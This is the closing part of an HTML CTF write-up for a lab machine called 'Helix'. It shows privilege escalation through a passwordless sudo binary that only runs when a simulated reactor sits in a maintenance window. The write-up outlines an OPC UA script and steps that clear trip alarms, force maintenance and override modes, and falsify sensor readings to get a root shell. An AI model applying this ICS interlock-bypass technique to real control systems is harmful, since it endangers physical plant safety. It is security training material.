+</section>
+
+<section class="section" id="privesc">
+  <div class="wrap">
+    <div class="sec-hdr"><span class="phase p-priv">Phase 04</span><h2 class="sec-title">Privilege Escalation</h2></div>
+
+    <h3>Sudo Enumeration</h3>
+
+    <div class="ss">
+      <img src="img6.png" loading="lazy" alt="sudo -l showing NOPASSWD rule for helix-maint-console">
+      <div class="ss-cap"><code>sudo -l</code> &mdash; operator may run <code>/usr/local/sbin/helix-maint-console</code> as root with no password required</div>
+    </div>
+
+    <p>The <code>operator</code> account has a passwordless sudo rule for a single binary: <code>helix-maint-console</code>. Analysis of this binary reveals it only executes when the reactor is inside a defined <strong>maintenance window</strong>: temperature between 293&ndash;305&deg;C and pressure between 72&ndash;75 bar. Outside those bounds, it exits cleanly without granting any access.</p>
+
+    <h3>The ICS Exploitation Path</h3>
+    <p>This is where the box diverges from a standard CTF. Root requires not just a sudo rule, but the ability to manipulate an OPC UA industrial control system to drive a simulated reactor into a specific operational state before the privileged binary will cooperate.</p>
+
+    <div class="callout c-crit">
+      <div class="c-ttl">ICS Abuse Chain</div>
+      Write to OPC UA writable nodes &rarr; increment Calibration Offset register &rarr; shift reactor sensor readings into maintenance window &rarr; invoke <code>sudo helix-maint-console</code> while conditions hold &rarr; root shell.
+    </div>
+
+    <h3>OPC UA Exploitation Script</h3>
+    <p>The custom Python script below uses the <code>opcua</code> library to connect to the local OPC UA server, map all control nodes, clear any active trip alarm, switch the system into MAINTENANCE mode, then ramp the calibration offset until the reactor readings land inside the target window. A hold loop keeps the state open long enough to invoke the privileged binary.</p>
+
+    <div class="cb">
+      <div class="cb-head"><div class="dots"><span></span><span></span><span></span></div><span class="cb-lang">python3 &mdash; opcua_exploit.py</span></div>
+      <pre>#!/usr/bin/env python3
+# Helix HTB - OPC UA Maintenance Window Exploit
+# Author: pr0ph3c | Target: opc.tcp://127.0.0.1:4840/helix/
+
+from opcua import Client, ua
+import time, sys
+
+OPC_URL          = "opc.tcp://127.0.0.1:4840/helix/"
+WINDOW_TEMP_LOW  = 293.0
+WINDOW_TEMP_HIGH = 305.0
+WINDOW_PRES_LOW  = 72.0
+WINDOW_PRES_HIGH = 75.0
+TRIP_TEMP        = 302.0
+TRIP_PRES        = 74.0
+RAMP_STEP        = 2.0
+RAMP_DELAY       = 4      # seconds per step
+
+NODE_IDS = {
+    'temp'     : "ns=2;i=4",
+    'pressure' : "ns=2;i=5",
+    'calib'    : "ns=2;i=6",   # Calibration Offset -- writable
+    'mode'     : "ns=2;i=12",  # Mode: NORMAL / MAINTENANCE
+    'override' : "ns=2;i=13",  # TestOverride boolean
+    'reset'    : "ns=2;i=14",  # ResetTrip boolean pulse
+    'trip'     : "ns=2;i=10",  # Trip Active alarm flag
+}
+
+# Phase 1: enumerate namespace urn:helix:ot, browse all nodes
+# Phase 2: bind Node objects to each NODE_ID
+# Phase 3: clear active trip (zero offset, reset flag, wait for safe readings)
+# Phase 4: write mode="MAINTENANCE" and override=True
+# Phase 5: ramp calib offset; back off near TRIP_* thresholds; stop at window
+# Phase 6: hold window by rewriting all control values every 3s
+#           -- invoke sudo helix-maint-console in a second terminal --</pre>
+    </div>
+
+    <div class="steps">
+      <div class="step">
+        <div class="sn">1</div>
+        <div class="sb">
+          <div class="st">Connect and Enumerate OPC UA Nodes</div>
+          <p>Connect to <code>opc.tcp://127.0.0.1:4840/helix/</code> and browse the <code>urn:helix:ot</code> namespace. Print all readable node IDs, display names, values, and data types &mdash; confirming they match the PDF documentation we cracked earlier.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="sn">2</div>
+        <div class="sb">
+          <div class="st">Resolve Control Registers</div>
+          <p>Bind Python <code>Node</code> objects to the seven key node IDs: temperature, pressure, calibration offset, mode, test override, reset trip, and trip alarm. Safe-read and safe-write wrappers handle automatic reconnection if the PLC drops the session.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="sn">3</div>
+        <div class="sb">
+          <div class="st">Clear Active Trip Alarm</div>
+          <p>Zero the calibration offset, disable the override flag, and set mode to NORMAL. Poll temperature and pressure until both drop below safe thresholds, then pulse the <code>ResetTrip</code> node. Without this step, the MAINTENANCE mode write will be rejected by the PLC safety logic.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="sn">4</div>
+        <div class="sb">
+          <div class="st">Switch to Maintenance Mode</div>
+          <p>Write <code>"MAINTENANCE"</code> to the Mode register and <code>True</code> to TestOverride. Verify that the mode string change was accepted before proceeding &mdash; a failed write here means the ramp phase will not work.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="sn">5</div>
+        <div class="sb">
+          <div class="st">Ramp Calibration Offset into the Target Window</div>
+          <p>Increment the Calibration Offset by 2.0 units per cycle. After each write, read back both sensor values. Back off automatically when approaching the trip thresholds to avoid triggering an alarm. Stop when both temperature and pressure simultaneously fall inside the maintenance window.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="sn">6</div>
+        <div class="sb">
+          <div class="st">Hold Window and Escalate</div>
+          <p>Re-apply mode, override, and offset every 3 seconds to counteract the PLC's own correction logic trying to restore normal state. While the hold loop runs, invoke <code>sudo /usr/local/sbin/helix-maint-console</code> in a second terminal to spawn a root shell.</p>
+        </div>
+      </div>
+    </div>
+
+    <h3>Root Shell</h3>
+    <div class="cb">
+      <div class="cb-head"><div class="dots"><span></span><span></span><span></span></div><span class="cb-lang">bash</span></div>
+      <pre># Terminal 1: run exploit, wait for MAINTENANCE WINDOW REACHED
+python3 opcua_exploit.py
+
+[!!!] MAINTENANCE WINDOW REACHED
+      Temp=298.43C | Pres=73.21bar | Offset=14.0
+[hold 000] OPEN | Temp=298.43C | Pres=73.21bar
+[hold 001] OPEN | Temp=298.51C | Pres=73.19bar
+
+# Terminal 2: invoke privileged binary while window is held open
+sudo /usr/local/sbin/helix-maint-console
+
+root@helix:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@helix:~# cat /root/root.txt
+[ROOT FLAG]</pre>
+    </div>
+
+    <div class="kf">
+      <div class="kf-icon">&#127942;</div>
+      <div class="kf-text">
+        <strong>Rooted</strong>
+        Full chain complete. Helix chains a public NiFi CVE, an SSH key found in a service directory, an offline-cracked ICS manual, and direct OPC UA manipulation to achieve root &mdash; a creative box that bridges classical web exploitation with industrial control system attack techniques.
+      </div>
+    </div>
+  </div>
+</section>
+  </article>
+</div>
+
+<footer class="foot">
+  <div>&copy; <span id="yr"></span> pr0ph3c &mdash; Ish Bhatt &middot; <a href="../../index.html#blogs">back to portfolio</a></div>
+  <div class="eof">// Enumeration &rarr; CVE-2023-34468 &rarr; SSH Lateral &rarr; OPC UA ICS Abuse &rarr; Root &middot; EOF</div>
+</footer>
+
+<div class="lightbox" id="lightbox"><img id="lbimg" alt="enlarged figure" /></div>
+
+<script>
+(function(){
+  document.getElementById('yr').textContent=new Date().getFullYear();
+  // lightbox on screenshots
+  var lb=document.getElementById('lightbox'),lbimg=document.getElementById('lbimg');
+  Array.prototype.forEach.call(document.querySelectorAll('.ss img'),function(img){
+    img.addEventListener('click',function(){lbimg.src=img.src;lb.classList.add('open');});
+  });
+  lb.addEventListener('click',function(){lb.classList.remove('open');});
+  document.addEventListener('keydown',function(e){if(e.key==='Escape')lb.classList.remove('open');});
+  // scrollspy
+  var links=Array.prototype.slice.call(document.querySelectorAll('#toc a'));
+  var ids=links.map(function(l){return l.getAttribute('data-target');});
+  var spy=new IntersectionObserver(function(ents){
+    ents.forEach(function(e){
+      if(e.isIntersecting){links.forEach(function(l){l.classList.toggle('active',l.getAttribute('data-target')===e.target.id);});}
+    });
+  },{rootMargin:'-10% 0px -78% 0px'});
+  ids.forEach(function(id){var s=document.getElementById(id);if(s)spy.observe(s);});
+  // progress
+  var prog=document.getElementById('progress');
+  function onScroll(){var d=document.documentElement;var max=d.scrollHeight-d.clientHeight;prog.style.width=(max>0?(d.scrollTop/max*100):0)+'%';}
+  document.addEventListener('scroll',onScroll,{passive:true});onScroll();
+})();
+</script>
+</body>
+</html>
